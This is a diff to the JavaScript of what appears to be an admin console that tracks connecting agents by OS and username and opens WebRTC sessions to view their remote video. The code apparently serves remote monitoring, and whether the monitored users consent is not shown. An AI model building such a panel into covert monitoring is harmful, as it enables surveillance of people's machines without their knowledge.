@@ -109,7 +109,7 @@
                 }
                 else if (data.type === 'info') {
                     addLog(`🟢 New User: ${data.os || 'Unknown'} (${data.user || 'Unknown'})`, 'green');
-                    
+
                     // FIX: Prevent duplicates/spam
                     if (!users[data.id]) {
                         users[data.id] = { status: 'Online', logs: [], info: data, lastSeen: Date.now(), sessionActive: false };
@@ -330,31 +330,40 @@
             }
         }
 
-        function joinUser(id, status) {
-            // If we have stored signaling data, send it back
-            if (users[id] && users[id].signalingData) {
-                const sigData = users[id].signalingData;
+        async function joinUser(id, status) {
+            // Get or create session
+            const session = getSession(id);
+            const pc = session.pc;
+
+            // Reset video element
+            remoteVideo.srcObject = null;
+
+            // Create a dummy local stream to ensure the PC is active locally
+            // This helps in some browsers to establish the connection faster
+            try {
+                const localStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                localStream.getTracks().forEach(track => pc.addTrack(track, localStream));
+                
+                // Create an Offer from Admin side to force the Agent to respond
+                const offer = await pc.createOffer();
+                await pc.setLocalDescription(offer);
+                
                 ws.send(JSON.stringify({
-                    type: sigData.type,
+                    type: 'offer',
                     targetId: id,
-                    sdp: sigData.sdp,
-                    candidate: sigData.candidate
+                    sdp: pc.localDescription
                 }));
-                addLog(`[ADMIN] Resent ${sigData.type} to ${id}`, 'green');
-            } else {
-                // Request a new join
+                
+                addLog(`[ADMIN] Sent Offer to ${id}`, 'green');
+            } catch (err) {
+                addLog(`[WARN] Could not create local offer: ${err.message}`, 'yellow');
+                // Fallback: Just request join again
                 ws.send(JSON.stringify({
                     type: 'request_join',
                     targetId: id,
                     from: null
                 }));
-                addLog(`[ADMIN] Requested new join to ${id}`, 'blue');
             }
-
-            // Visual feedback
-            const card = document.querySelector(`button[onclick="joinUser('${id}', '${status}')"]`).parentElement;
-            card.style.borderColor = '#4ade80';
-            setTimeout(() => card.style.borderColor = '#3b82f6', 500);
         }
 
         function closeVideo() {
